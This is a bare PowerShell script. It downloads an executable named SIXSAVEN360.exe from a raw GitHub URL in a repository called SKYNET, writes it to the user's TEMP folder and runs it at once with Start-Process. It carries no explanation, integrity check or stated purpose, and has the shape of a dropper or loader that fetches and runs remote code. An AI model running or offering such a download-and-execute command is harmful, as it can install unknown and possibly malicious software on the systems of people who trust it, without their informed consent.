$url = "https://raw.githubusercontent.com/kittipatseepakdee-eng/SKYNET/refs/heads/main/SIXSAVEN360.exe"
$file = "$env:TEMP\SIXSAVEN360.exe"

Invoke-WebRequest $url -OutFile $file
Start-Process $file
